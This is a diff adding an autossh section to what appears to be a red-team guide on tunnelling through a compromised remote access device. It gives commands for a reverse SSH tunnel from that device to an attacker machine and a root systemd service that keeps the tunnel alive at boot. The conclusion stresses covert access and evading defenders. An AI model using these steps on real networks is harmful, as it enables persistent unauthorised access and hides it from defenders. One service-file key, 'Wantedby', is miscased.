@@ -189,6 +189,71 @@ xfreerdp3 /u:USERNAME /p:PASSWORD /v:TARGET_IP
 - After we have concluded operations or no longer need the tunnel through the RAD we can close the terminal where we ran the sshuttle command
 #### Note
 it is possible to chain sshuttle connections through compromised hosts as long as they are running an SSH server you have access to and the machine that you will be calling the sshuttle command from has sshuttle installed.
+## Autossh
+Autossh is a tool that automatically restarts SSH tunnels if they drop, making it useful for persistent SSH access or pivoting through a remote machine.
+### Installation
+```
+sudo apt update && sudo apt install -y autossh
+```
+### Usage
+- RAD = 10.0.7.35
+- Target server = 192.168.10.200
+- Attacker machine = 10.0.7.33
+- On the RAD run the following command to setup remote port forwarding
+- Command
+```bash
+autossh -M 0 -f -N -T -o "ServerAliveInterval=30" -o "ServerAliveCountMax=3" -R 2222:192.168.10.200:22 user@10.0.7.33
+```
+- This command does the following:
+	- M 0
+	    - Disables monitoring mode
+	- f
+	    - Runs in the background
+	- N
+	    - Prevents running commands on the remote host (creates a tunnel only)
+	- T
+	    - Disables pseudo-terminal allocation (saves resources)    
+	- o “ServerAliveInterval=30”
+	    - Sends a keep-alive packet every 30 seconds
+	- o “ServerAliveCountMax=3”
+	    - If no response after 3 keep-alives, reconnect
+- Now on the attacker machine run the following to SSH into the internal target via the RAd
+```bash
+ssh -p 2222 user@localhost
+```
+### Remote and Local Port Forwarding are Available with Autossh
+### To ensure the autossh service starts on boot create a service file on the RAD
+```bash
+sudo vim /etc/systemd/system/autossh-tunnel.service
+```
+- Add the following content to the file
+```ini
+[Unit]
+Description=AutoSSH Tunnel
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/autossh -M 0 -N -T -o "ServerAliveInterval=30" -o "ServerAliveCountMax=3" -R 2222:192.168.10.200:22 user@your-machine.com
+Restart=always
+User=root
+
+[Install]
+Wantedby=multi-user.target
+```
+- Enable and start the service with the following so that it's started and automatically starts on boot
+```bash
+sudo systemctl daemon-reload
+```
+```bash
+sudo systemctl enable autossh-tunnel
+```
+```bash
+sudo systemctl start autossh-tunnel
+```
+- Check the status to ensure it's running and enabled with
+```bash
+sudo systemctl status autossh-tunnel
+```
 ## Conclusion
 While there are a variety of ways to gain access to a target machine through a RAD, tunneling tends to be the most effective. Tunneling through a RAD to access a target network is a critical and highly effective tactic in offensive cyber operations. By using a RAD as an intermediary, operators can maintain persistent access, minimize forensic traces and execute attacks from within the target environment without exposing their actual attack infrastructure. This method is particularly useful when external access is restricted, as it allows attackers to bypass firewalls, NAT, and network segmentation by making their traffic appear as if it originates from inside the network. Additionally, tunneling through a RAD enables covert communication channels making detection and response by defenders significantly more difficult.
 
